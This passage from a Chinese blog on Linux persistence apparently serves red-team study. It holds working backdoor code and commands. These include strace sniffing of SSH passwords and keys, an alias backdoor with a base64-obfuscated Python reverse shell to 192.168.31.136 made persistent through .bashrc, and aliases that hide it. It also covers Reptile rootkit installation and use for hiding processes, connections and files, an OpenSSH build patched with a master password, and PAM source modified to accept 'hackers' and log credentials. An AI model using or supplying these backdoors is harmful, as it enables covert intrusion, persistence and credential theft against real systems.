href="#1、记录sshd明文" class="headerlink" title="1、记录sshd明文"></a>1、记录sshd明文</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">开启记录</span></span><br><span class="line">(strace -f -F -p `ps aux|grep &quot;sshd -D&quot;|grep -v grep|awk &#123;&#x27;print $2&#x27;&#125;` -t -e trace=read,write -s 32 2&gt; /tmp/.sshd.log &amp;)</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">管理员ssh连接后查看.sshd.log中的记录</span></span><br><span class="line">grep -E &#x27;read\(6, &quot;.+\\0\\0\\0\\.+&quot;&#x27; /tmp/.sshd.log</span><br></pre></td></tr></table></figure><p><img src="/posts/1e8c3e31/1668043361196-b97ffc94-e123-4516-9e02-76ec92b03abc.png" alt="image.png"></p><h3 id="2、记录sshd私钥"><a href="#2、记录sshd私钥" class="headerlink" title="2、记录sshd私钥"></a>2、记录sshd私钥</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(strace -f -F -p `ps aux|grep &quot;sshd -D&quot;|grep -v grep|awk &#123;&#x27;print $2&#x27;&#125;` -t -e trace=read,write -s 4096 2&gt; /tmp/.sshd.log &amp;)</span><br><span class="line">grep &#x27;PRIVATE KEY&#x27; /tmp/.sshd.log</span><br></pre></td></tr></table></figure><h2 id="命令自定义-Alias后门"><a href="#命令自定义-Alias后门" class="headerlink" title="命令自定义-Alias后门"></a>命令自定义-Alias后门</h2><p>alias命令的功能：为命令设置别名</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">定义：</span></span><br><span class="line">alias ls=&#x27;ls -al&#x27;</span><br></pre></td></tr></table></figure><p>每次输入ls命令的时候都能实现ls -al<br><img src="/posts/1e8c3e31/1668043941382-10964b1b-5df2-4c47-bbc3-65b2c23ae5b8.png" alt="image.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">删除别名</span></span><br><span class="line">unalias ls</span><br></pre></td></tr></table></figure><h3 id="1、简单版"><a href="#1、简单版" class="headerlink" title="1、简单版"></a>1、简单版</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">将<span class="built_in">ls</span>设置为反弹shell</span></span><br><span class="line">alias ls=&#x27;alerts()&#123; ls $* --color=auto;bash -i &gt;&amp; /dev/tcp/192.168.31.136/3333 0&gt;&amp;1; &#125;;alerts&#x27;</span><br></pre></td></tr></table></figure><p>当输入ls时就会反弹shell<br><img src="/posts/1e8c3e31/1668044210623-95f2b094-07bf-438b-a99d-9c8d2cec0e20.png" alt="image.png"><br>但是该方法有一个缺点：输入ls后会卡住<br><img src="/posts/1e8c3e31/1668044317325-4fbee66c-ead6-4aa4-83a9-d361c1b38c14.png" alt="image.png"></p><h3 id="2、升级版"><a href="#2、升级版" class="headerlink" title="2、升级版"></a>2、升级版</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alias ls=&#x27;alerts()&#123; ls $* --color=auto;python3 -c &quot;import base64,sys;exec(base64.b64decode(&#123;2:str,3:lambda b:bytes(b,&#x27;\&#x27;&#x27;UTF-8&#x27;\&#x27;&#x27;)&#125;[sys.version_info[0]](&#x27;\&#x27;&#x27;aW1wb3J0IG9zLHNvY2tldCxzdWJwcm9jZXNzOwpyZXQgPSBvcy5mb3JrKCkKaWYgcmV0ID4gMDoKICAgIGV4aXQoKQplbHNlOgogICAgdHJ5OgogICAgICAgIHMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCiAgICAgICAgcy5jb25uZWN0KCgiMTkyLjE2OC4zMS4xMzYiLCA2NjY2KSkKICAgICAgICBvcy5kdXAyKHMuZmlsZW5vKCksIDApCiAgICAgICAgb3MuZHVwMihzLmZpbGVubygpLCAxKQogICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSwgMikKICAgICAgICBwID0gc3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsICItaSJdKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIGV4aXQoKQ==&#x27;\&#x27;&#x27;)))&quot;;&#125;;alerts&#x27;</span><br></pre></td></tr></table></figure><p>命令中的base64解密如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import os,socket,subprocess;</span><br><span class="line">ret = os.fork()</span><br><span class="line">if ret &gt; 0:</span><br><span class="line">    exit()</span><br><span class="line">else:</span><br><span class="line">    try:</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.connect((&quot;192.168.31.136&quot;, 6666))</span><br><span class="line">        os.dup2(s.fileno(), 0)</span><br><span class="line">        os.dup2(s.fileno(), 1)</span><br><span class="line">        os.dup2(s.fileno(), 2)</span><br><span class="line">        p = subprocess.call([&quot;/bin/sh&quot;, &quot;-i&quot;])</span><br><span class="line">    except Exception as e:</span><br><span class="line">        exit()</span><br></pre></td></tr></table></figure><p>就是利用socket反弹一个shell<br>继续输入命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alias unalias=&#x27;alerts()&#123; if [ $# != 0 ]; then if [ $* != &quot;ls&quot; ]&amp;&amp;[ $* != &quot;alias&quot; ]&amp;&amp;[ $* != &quot;unalias&quot; ]; then unalias $*;else echo &quot;-bash: unalias: $&#123;*&#125;: not found&quot;;fi;else echo &quot;unalias: usage: unalias [-a] name [name ...]&quot;;fi;&#125;;alerts&#x27;</span><br><span class="line">alias alias=&#x27;alerts()&#123; alias &quot;$@&quot; | grep -v unalias | sed &quot;s/alerts.*lambda.*/ls --color=auto&#x27;\&#x27;&#x27;/&quot;;&#125;;alerts&#x27;</span><br></pre></td></tr></table></figure><p>执行ls后会反弹shell<br><img src="/posts/1e8c3e31/1668045812049-1f057439-e381-4e31-93b2-bd5e3618d032.png" alt="image.png"><br><strong>但是该方法重启之后会失效</strong></p><h3 id="3、持久化-隐藏"><a href="#3、持久化-隐藏" class="headerlink" title="3、持久化+隐藏"></a>3、持久化+隐藏</h3><p>重启后依旧有效</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/upload</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">将上面的三个后门命令写入</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">alias ls=&#x27;alerts()&#123; ls $* --color=auto;python3 -c &quot;import base64,sys;exec(base64.b64decode(&#123;2:str,3:lambda b:bytes(b,&#x27;\&#x27;&#x27;UTF-8&#x27;\&#x27;&#x27;)&#125;[sys.version_info[0]](&#x27;\&#x27;&#x27;aW1wb3J0IG9zLHNvY2tldCxzdWJwcm9jZXNzOwpyZXQgPSBvcy5mb3JrKCkKaWYgcmV0ID4gMDoKICAgIGV4aXQoKQplbHNlOgogICAgdHJ5OgogICAgICAgIHMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCiAgICAgICAgcy5jb25uZWN0KCgiMTkyLjE2OC4zMS4xMzYiLCA2NjY2KSkKICAgICAgICBvcy5kdXAyKHMuZmlsZW5vKCksIDApCiAgICAgICAgb3MuZHVwMihzLmZpbGVubygpLCAxKQogICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSwgMikKICAgICAgICBwID0gc3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsICItaSJdKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIGV4aXQoKQ==&#x27;\&#x27;&#x27;)))&quot;;&#125;;alerts&#x27;</span><br><span class="line">alias unalias=&#x27;alerts()&#123; if [ $# != 0 ]; then if [ $* != &quot;ls&quot; ]&amp;&amp;[ $* != &quot;alias&quot; ]&amp;&amp;[ $* != &quot;unalias&quot; ]; then unalias $*;else echo &quot;-bash: unalias: $&#123;*&#125;: not found&quot;;fi;else echo &quot;unalias: usage: unalias [-a] name [name ...]&quot;;fi;&#125;;alerts&#x27;</span><br><span class="line">alias alias=&#x27;alerts()&#123; alias &quot;$@&quot; | grep -v unalias | sed &quot;s/alerts.*lambda.*/ls --color=auto&#x27;\&#x27;&#x27;/&quot;;&#125;;alerts&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vim ~/.bashrc</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">在最后面写入</span></span><br><span class="line">if [ -f /etc/upload ]; then</span><br><span class="line">. /etc/upload</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p>重启后输入ls依旧可以反弹shell<br><img src="/posts/1e8c3e31/1668047185034-c2d92e26-4c81-4068-b76b-7c68490334d9.png" alt="image.png"></p><h2 id="内核加载LKM-Rootkit后门"><a href="#内核加载LKM-Rootkit后门" class="headerlink" title="内核加载LKM-Rootkit后门"></a>内核加载LKM-Rootkit后门</h2><p>现在常用的linux维持权限的方法大多用crontab和开机自启动，同时使用的大多是msf 或者其它的tcp连接来反弹shell ,这种做法比较容易被管理员发现。所以我们想有一个非tcp连接、流量不容易被怀疑的后门，并且在大量的shell的场景下，可以管shell，Reptile刚好是种LKM rootkit，因此具有很好的隐藏性和强大的功能。<br><a href="https://github.com/f0rb1dd3n/Reptile/releases/">https://github.com/f0rb1dd3n/Reptile/releases/</a></p><h3 id="自动化脚本搭建"><a href="#自动化脚本搭建" class="headerlink" title="自动化脚本搭建"></a>自动化脚本搭建</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim shell.sh</span><br></pre></td></tr></table></figure><h4 id="Centos"><a href="#Centos" class="headerlink" title="Centos"></a>Centos</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">kernel=`<span class="built_in">uname</span> -r`</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">centos</span></span><br><span class="line">yum -y install perl vim gcc make g++ unzip</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">由于Cenots内核管理不便，所以使用下载对应版本的kernel-devel到本地</span></span><br><span class="line">yum -y localinstall kernel-devel-&quot;$kernal&quot;.rpm</span><br><span class="line">cd Reptile-2.0/ &amp;&amp; chmod +x ./setup.sh </span><br><span class="line">./setup.sh install &lt;&lt;EOF</span><br><span class="line">reptile</span><br><span class="line">hax0r</span><br><span class="line">s3cr3t</span><br><span class="line">reptile</span><br><span class="line">666</span><br><span class="line">y</span><br><span class="line">192.168.31.136</span><br><span class="line">4444</span><br><span class="line">1</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><p>需要修改6行的文件地址<br>8，9行为密码和口令<br>14,15行为接收ip及端口</p><h4 id="ubuntu"><a href="#ubuntu" class="headerlink" title="ubuntu"></a>ubuntu</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">apt-get install vim gcc make g++ unzip -y</span><br><span class="line">apt-get -y install linux-headers-$(uname -r)</span><br><span class="line">cd Reptile-2.0/ &amp;&amp; chmod +x ./setup.sh</span><br><span class="line">./setup.sh install &lt;&lt;EOF</span><br><span class="line">reptile</span><br><span class="line">hax0r</span><br><span class="line">s3cr3t</span><br><span class="line">reptile</span><br><span class="line">666</span><br><span class="line">y</span><br><span class="line">192.168.31.136</span><br><span class="line">4444</span><br><span class="line">1</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 shell.sh</span><br><span class="line">./shell.sh</span><br></pre></td></tr></table></figure><p><img src="/posts/1e8c3e31/1668049640677-570d3cf1-aa11-45d3-a6df-a40dce95fce6.png" alt="image.png"><br>安装完成</p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p><a href="https://github.com/f0rb1dd3n/Reptile/wiki">https://github.com/f0rb1dd3n/Reptile/wiki</a></p><h4 id="隐藏进程"><a href="#隐藏进程" class="headerlink" title="隐藏进程"></a>隐藏进程</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">隐藏进程</span></span><br><span class="line">/reptile/reptile_cmd hide</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">显示进程</span></span><br><span class="line">/reptile/reptile_cmd show</span><br></pre></td></tr></table></figure><p>测试</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup ping 114.114.114.114 &amp; ps -ef | grep ping | grep -v grep</span><br></pre></td></tr></table></figure><p><img src="/posts/1e8c3e31/1668050007522-2c016976-4440-4c36-862f-e8a6c27e46f9.png" alt="image.png"><br>创建了一个ping进程<br>尝试把进程隐藏</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/reptile/reptile_cmd hide 12551</span><br><span class="line">ps -ef | grep ping | grep -v grep</span><br></pre></td></tr></table></figure><p><img src="/posts/1e8c3e31/1668050076342-1301f63e-eec6-4fcf-8846-5e3392fe537e.png" alt="image.png"><br>进程成功隐藏</p><h4 id="隐藏连接"><a href="#隐藏连接" class="headerlink" title="隐藏连接"></a>隐藏连接</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">隐藏连接:</span> </span><br><span class="line">/reptile/reptile_cmd [udp/tcp等] [目标地址] hide</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">显示连接:</span></span><br><span class="line">/reptile/reptile_cmd [udp/tcp等] [目标地址] show</span><br></pre></td></tr></table></figure><p>使用msf上线会存在一个连接，可以使用reptile隐藏</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netstat -anpt | grep 192.168.31.136</span><br><span class="line">/reptile/reptile_cmd tcp 192.168.31.136 7878 hide</span><br></pre></td></tr></table></figure><p><img src="/posts/1e8c3e31/1668051009023-59989ebc-9a4d-4acc-b20b-2149430654b5.png" alt="image.png"></p><h4 id="隐藏文件"><a href="#隐藏文件" class="headerlink" title="隐藏文件"></a>隐藏文件</h4><p>文件名中带reptile的都会被隐藏</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir reptile_123</span><br><span class="line">ls</span><br><span class="line">cd reptile_123</span><br></pre></td></tr></table></figure><p>使用ls可以无法看到文件,但是可以cd进文件<br><img src="/posts/1e8c3e31/1668051228687-b2817603-bff6-464c-aa87-3ba0209c1e23.png" alt="image.png"></p><h3 id="客户端使用"><a href="#客户端使用" class="headerlink" title="客户端使用"></a>客户端使用</h3><p>客户端安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd Reptile-2.0/</span><br><span class="line">./setup.sh client</span><br></pre></td></tr></table></figure><p><img src="/posts/1e8c3e31/1668060445419-6594e286-2699-4367-8337-7aa46f601d4b.png" alt="image.png"><br>启动客户端</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd bin</span><br><span class="line">./client</span><br></pre></td></tr></table></figure><p><img src="/posts/1e8c3e31/1668060658242-7323d2e7-08a3-45a1-a328-53d86609ae0e.png" alt="image.png"><br>设置连接配置</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">set LHOST x.x.x.x#接受shell地址</span><br><span class="line">set LPORT xxxx#接受shell端口</span><br><span class="line">set SRCHOST x.x.x.x#接受shell地址</span><br><span class="line">set SRCPORT 666#前面后门配置中的SRC port</span><br><span class="line">set RHOST x.x.x.x#目标地址</span><br><span class="line">set RPORT 22#远程端口(仅适用于TCP/UDP) 这里选择22模拟ssh</span><br><span class="line">set PROT TCP #发送数据包的协议(ICMP/TCP/UDP)</span><br><span class="line">set PASS s3cr3t #后门密码(前面设置的)</span><br><span class="line">set TOKEN hax0r #后门Token</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/posts/1e8c3e31/1668062022223-64d84f36-7e11-4f1c-ab1b-70cff9d805ae.png" alt="image.png"><br><img src="/posts/1e8c3e31/1668062039478-b41e8b5f-9168-4153-bcc8-40d2721d3a7d.png" alt="image.png"><br>成功返回shell,除了返回shell 还可以上传下载文件等<br><img src="/posts/1e8c3e31/1668062935375-32c77ff5-faad-4be4-9eda-045c7d5ca0dc.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux权限维持(一)-OpenSSH&amp;PAM后门&amp;软链接&amp;公私钥&amp;新用户</title>
      <link href="/posts/cf253a42/"/>
      <url>/posts/cf253a42/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux权限维持-一-OpenSSH-amp-PAM后门-amp-软链接-amp-公私钥-amp-新用户"><a href="#Linux权限维持-一-OpenSSH-amp-PAM后门-amp-软链接-amp-公私钥-amp-新用户" class="headerlink" title="Linux权限维持(一)-OpenSSH&amp;PAM后门&amp;软链接&amp;公私钥&amp;新用户"></a>Linux权限维持(一)-OpenSSH&amp;PAM后门&amp;软链接&amp;公私钥&amp;新用户</h1><h2 id="替换版本-OpenSSH后门"><a href="#替换版本-OpenSSH后门" class="headerlink" title="替换版本-OpenSSH后门"></a>替换版本-OpenSSH后门</h2><p>原理：替换本身操作系统的ssh协议支撑软件openssh，重新安装自定义的openssh,达到记录帐号密码，也可以采用万能密码连接的功能！<br><a href="https://www.cnblogs.com/csnd/p/11807653.html">https://www.cnblogs.com/csnd/p/11807653.html</a><br><a href="https://mp.weixin.qq.com/s/BNrJHUs9qxEVHNSFEghaRw">https://mp.weixin.qq.com/s/BNrJHUs9qxEVHNSFEghaRw</a></p><h3 id="1、环境准备"><a href="#1、环境准备" class="headerlink" title="1、环境准备"></a>1、环境准备</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">yum -y install openssl openssl-devel pam-devel zlib zlib-devel </span><br><span class="line">yum -y install gcc gcc-c++ make </span><br><span class="line">wget http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz</span><br><span class="line">wget https://mirror.aarnet.edu.au/pub/OpenBSD/OpenSSH/portable/openssh-5.9p1.tar.gz</span><br><span class="line">tar -xzvf openssh-5.9p1.tar.gz </span><br><span class="line">tar -xzvf 0x06-openssh-5.9p1.patch.tar.gz</span><br><span class="line">cp openssh-5.9p1.patch/sshbd5.9p1.diff openssh-5.9p1</span><br><span class="line">cd openssh-5.9p1 &amp;&amp; patch &lt; sshbd5.9p1.diff</span><br></pre></td></tr></table></figure><h3 id="2、编辑密码"><a href="#2、编辑密码" class="headerlink" title="2、编辑密码"></a>2、编辑密码</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim includes.h</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">177</span> <span class="meta">#<span class="keyword">define</span> ILOG <span class="string">&quot;/tmp/ilog&quot;</span><span class="comment">//ILOG是别人用ssh登录该主机记录的日志目录</span></span></span><br><span class="line"><span class="number">178</span> <span class="meta">#<span class="keyword">define</span> OLOG <span class="string">&quot;/tmp/olog&quot;</span><span class="comment">//OLOG是该主机用ssh登录其他主机记录的日志目录 </span></span></span><br><span class="line"><span class="number">179</span> <span class="meta">#<span class="keyword">define</span> SECRETPW <span class="string">&quot;test&quot;</span><span class="comment">//万能密码修改成自己想要的密码</span></span></span><br><span class="line"><span class="number">180</span> <span class="meta">#<span class="keyword">endif</span> <span class="comment">/* INCLUDES_H */</span></span></span><br></pre></td></tr></table></figure><p><img src="/posts/cf253a42/1667869234022-45adc272-a48b-46be-b192-c3bb880d9f79.png" alt="image.png"></p><h3 id="3、安装编译"><a href="#3、安装编译" class="headerlink" title="3、安装编译"></a>3、安装编译</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam --with-kerberos5 &amp;&amp; make &amp;&amp; make install</span><br><span class="line">service sshd restart #重启sshd服务</span><br><span class="line">systemctl status sshd.service #查看ssh启动状态</span><br></pre></td></tr></table></figure><p><img src="/posts/cf253a42/1667869874300-ca43aa5a-d0b9-4691-8305-2820b5ccd13c.png" alt="image.png"><br>出现报错,解决方案:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">chmod 600 /etc/ssh/ssh_host_rsa_key</span><br><span class="line">chmod 600 /etc/ssh/ssh_host_ecdsa_key</span><br><span class="line">service sshd start</span><br><span class="line">chown -R root.root /var/empty/sshd</span><br><span class="line">chmod 744 /var/empty/sshd</span><br><span class="line">service sshd restart</span><br></pre></td></tr></table></figure><p><img src="/posts/cf253a42/1667870045088-0ad0b4f0-765e-4d34-b63e-a352b31c85e5.png" alt="image.png"><br>成功启动<br>然后用kali去连接主机，直接用刚才创建的万能密码就可以连接成功<br><img src="/posts/cf253a42/1667870423231-a8510b5c-95d6-4851-aa18-82fc83b14d05.png" alt="image.png"><br>同时当管理员使用使用原密码登录时，也可以成功登录而且登录的密码会记录在&#x2F;tmp&#x2F;ilog下<br><img src="/posts/cf253a42/1667870680673-ee4492fb-1d66-4943-b405-9140374f0e49.png" alt="image.png"><br>更多玩法可以看前面提到的两篇文章</p><h2 id="更改验证-SSH-PAM后门"><a href="#更改验证-SSH-PAM后门" class="headerlink" title="更改验证-SSH-PAM后门"></a>更改验证-SSH-PAM后门</h2><p>参考：<a href="https://xz.aliyun.com/t/7902">https://xz.aliyun.com/t/7902</a><br>PAM是一种认证模块，PAM可以作为Linux登录验证和各类基础服务的认证，简单来说就是一种用于Linux系统上的用户身份验证的机制。进行认证时首先确定是什么服务，然后加载相应的PAM的配置文件(位于&#x2F;etc&#x2F;pam.d)，最后调用认证文件(位于&#x2F;lib&#x2F;security)进行安全认证.简易利用的PAM后门也是通过修改PAM源码中认证的逻辑来达到权限维持<br>1、获取目标系统所使用的PAM版本，下载对应版本的pam版本<br>2、解压缩，修改pam_unix_auth.c文件，添加万能密码<br>3、编译安装PAM<br>4、编译完后的文件在：modules&#x2F;pam_unix&#x2F;.libs&#x2F;pam_unix.so，复制到&#x2F;lib64&#x2F;security中进行替换，即使用万能密码登陆，将用户名密码记录到文件中。</p><h3 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h3><p>关闭防火墙</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setenforce 0</span><br></pre></td></tr></table></figure><p>查询版本pam版本 </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpm -qa | grep pam</span><br></pre></td></tr></table></figure><p><img src="/posts/cf253a42/1667875436908-bbb429e2-c545-4037-bef4-83613d82a02b.png" alt="image.png"><br>下载对应版本<a href="https://github.com/linux-pam/linux-pam/tags">https://github.com/linux-pam/linux-pam/tags</a>,拖到主机上，如果不能上传文件可以传到web服务上然后利用wget下载<br><img src="/posts/cf253a42/1667876227260-fef9da74-b0f3-47b0-bfac-2bfe1fffb0a1.png" alt="image.png"><br>解压</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip Linux-PAM-1.1.8-master.zip</span><br></pre></td></tr></table></figure><p>安装依赖</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install gcc flex flex-devel -y</span><br></pre></td></tr></table></figure><h3 id="修改配置"><a href="#修改配置" class="headerlink" title="修改配置"></a>修改配置</h3><p>留PAM后门和保存SSH登录的账号密码<br>修改<code>Linux-PAM-1.1.8-master/modules/pam_unix/pam_unix_auth.c</code><br><img src="/posts/cf253a42/1667876912494-59149cec-b0ff-43a9-bfa1-dfd14ac3a2e4.png" alt="image.png"><br>将该段代码修改为以下的代码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/* verify the password of this user */</span><br><span class="line">retval = _unix_verify_password(pamh, name, p, ctrl);</span><br><span class="line">if(strcmp(&quot;hackers&quot;,p)==0)&#123;return PAM_SUCCESS;&#125; //后门密码</span><br><span class="line">if(retval == PAM_SUCCESS)&#123; </span><br><span class="line">FILE * fp; </span><br><span class="line">fp = fopen(&quot;/tmp/.sshlog&quot;, &quot;a&quot;);//SSH登录用户密码保存位置</span><br><span class="line">fprintf(fp, &quot;%s : %s\n&quot;, name, p); </span><br><span class="line">fclose(fp);&#125; </span><br><span class="line">name = p = NULL;</span><br><span class="line">AUTH_RETURN;</span><br></pre></td></tr></table></figure><p><img src="/posts/cf253a42/1667876986630-14589858-6952-4364-aaf2-666b10596fb3.png" alt="image.png"><br>hackers就是后门密码</p><h3 id="编译安装"><a href="#编译安装" class="headerlink" title="编译安装"></a>编译安装</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd Linux-PAM-1.1.8-master</span><br><span class="line">./configure &amp;&amp; make</span><br></pre></td></tr></table></figure><h3 id="备份复制"><a href="#备份复制" class="headerlink" title="备份复制"></a>备份复制</h3><p>备份原有pam_unix.so,防止出现错误登录不上<br>复制新PAM模块到&#x2F;lib64&#x2F;security&#x2F;目录下 </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/lib64/security/pam_unix.so /tmp/pam_unix.so.bakcp</span><br><span class="line">cd Linux-PAM-1.1.8/modules/pam_unix/.libs</span><br><span class="line">cp pam_unix.so /usr/lib64/security/pam_unix.so</span><br></pre></td></tr></table></figure><p>用刚才配置的密码hackers即可登录<br><img src="/posts/cf253a42/1667877538630-07222fc6-41d5-4f65-94b1-7b1a368d77f4.png" alt="image.png"></p><h2 id="登录方式-软链接-amp-公私钥-amp-新帐号"><a 